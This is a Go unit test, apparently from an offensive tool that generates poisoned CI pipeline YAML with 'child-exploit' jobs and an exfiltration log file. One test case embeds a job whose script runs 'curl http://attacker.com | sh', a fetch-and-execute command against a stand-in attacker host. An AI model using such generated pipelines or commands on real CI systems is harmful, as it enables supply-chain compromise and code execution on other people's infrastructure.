package payloads

import (
	"strings"
	"testing"
)

func TestGenerateTriggerArtifactYAML(t *testing.T) {
	tests := []struct {
		name     string
		opts     TriggerArtifactOptions
		contains []string
	}{
		{
			name: "default trigger artifact",
			opts: TriggerArtifactOptions{},
			contains: []string{
				"trigger-artifact:",
				"child-ci.yml",
				"CHILD_CI",
				"child-exploit:",
				".trigger-exfil.log",
				"hexdump",
				"artifacts:",
			},
		},
		{
			name: "custom child content",
			opts: TriggerArtifactOptions{
				Common:             CommonOptions{JobName: "poison"},
				MaliciousCIContent: "evil:\n  script:\n    - curl http://attacker.com | sh",
				ArtifactPath:       "dynamic.yml",
			},
			contains: []string{
				"poison:",
				"dynamic.yml",
				"curl http://attacker.com",
			},
		},
		{
			name: "with tags",
			opts: TriggerArtifactOptions{
				Common: CommonOptions{Tags: []string{"docker"}},
			},
			contains: []string{
				"tags:",
				"docker",
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			y := GenerateTriggerArtifactYAML(tc.opts)
			for _, s := range tc.contains {
				if !strings.Contains(y, s) {
					t.Errorf("expected %q in output:\n%s", s, y)
				}
			}
			_ = mustParse(t, y)
		})
	}
}
